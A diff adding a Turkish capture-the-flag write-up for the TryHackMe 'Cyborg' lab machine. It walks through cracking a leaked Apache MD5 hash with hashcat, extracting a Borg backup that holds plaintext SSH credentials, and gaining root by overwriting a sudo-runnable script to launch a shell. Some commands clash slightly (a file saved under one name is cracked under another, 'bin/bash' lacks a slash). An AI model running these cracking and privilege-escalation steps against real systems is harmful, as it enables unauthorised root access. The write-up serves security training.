@@ -90,5 +90,111 @@ Dosyayı incelemeden once /etc alt dizin adresimizide bir ziyaret edelim.
 
 ![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a3.png?raw=true)
 
+passwd dosyasıni indirelim ve inceleyelim.
+
+>music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+
+music_archive’in hashi elimizde. Bu hashi hashcat ile kırabiliriz.
+
+Hash'i bir txt dosyasına kaydedelim.
+
+>echo 'music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > unshadowed.txt
+
+john the ripper kullanarak hash'i kırıyoruz.
+
+>hashcat -m 1600 -a 0 hash.txt /path/to/file/rockyou.txt
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a4.png?raw=true)
+
+>squidward
+
+music_archive dosyasının şifresini biliyoruz. Diğer dosyaya geçelim.
+
+archive.tar dosyasını çıkartalım.
+
+>tar -xvf archive.tar
+
+README.md dosyasını dikkatimi çekti ve dosyayı açtım.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a5.png?raw=true)
+
+Bu dosyaların bir Borg yedekleme deposu olduğunu söylüyor.
+
+Burada Borg’u araştırmamız gerekiyor. Verdiği link aslında oldukça yardımcı oluyor.
+
+Borg’un ne olduğunu anlamanız ve nasıl kullanıldığını öğrenmeniz gerekiyor.
+
+https://borgbackup.readthedocs.io/
+
+Verdigi sitede Quick Start kısmında nasıl kullanılacağı anlatılmış.
+
+Borg'u kuralım.
+>sudo apt-get install borg
 
 
+
+```
+borg list home/field/dev/final_archive
+
+──(kali㉿kali)-[~/Downloads]
+└─$ borg list home/field/dev/final_archive 
+Enter passphrase for key /home/kali/Downloads/home/field/dev/final_archive: 
+music_archive                Tue, 2020-12-29 17:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
+```
+
+Bu komutu çalıştırınca yukarıda bulduğumuz şifreyi girdim ve başarılı oldum.
+
+Güzel, “music_archive” dosyasını bulduk. Şimdi, içerisinde neler olduğuna bakalım.
+
+Aşağıdaki komut ile “music_archive” içeriğini listeleyebiliriz
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a6.png?raw=true)
+
+İçeriğinin sonunda “secret.txt” ve “note.txt” dikkatimi çekti. Bu dosyaları incelemek için “music_archive” dosyasını çıkartalım
+
+>borg extract home/field/dev/final_archive::music_archive
+
+home içerisine alex adlı dosya çıkartıldı. Bu notlara bakalım.
+
+>cat home/alex/Documents/note.txt
+
+note.txt dosyasını açtığımızda kullanıcı adı ve şifreyi buluyoruz.
+>alex:S3cretP@s3
+
+Bulduğumuz kullanıcı adı ve şifreyle ssh servisine girelim.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a7.png?raw=true)
+
+Makineye giriş yapmayı başardık. user bayrağını alalım.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a8.png?raw=true)
+
+```
+user_flag:flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
+```
+Geriye root bayrağını almak kaldı. Yetki yükseltme işlemi yaparak roota erişmeye çalışalım.
+
+>sudo -l
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a9.png?raw=true)
+
+
+/etc/mp3backups/backup.sh dosyasını çalıştırabiliyoruz. Kontrol edelim ve değiştirmeye çalışalım.
+
+> chmod 777 /etc/mp3backups/backup.sh //backup.sh dosyasının izinlerini değiştiriyoruz.
+
+> echo "bin/bash" > /etc/mp3backups/backup.sh //backup.sh dosyasına /bin/bash komutunu ekliyoruz.
+
+> sudo /etc/mp3backups/backup.sh // dosyayı çalıştırıyoruz.
+
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a10.png?raw=true)
+
+Artık root olduğumuza göre root bayrağını alabiliriz.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a11.png?raw=true)
+
+```
+root_flag:flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
+```
+
+Ve böylelikle bir ctf daha tamamladık gelecek yazılarımda görüşmek üzere.
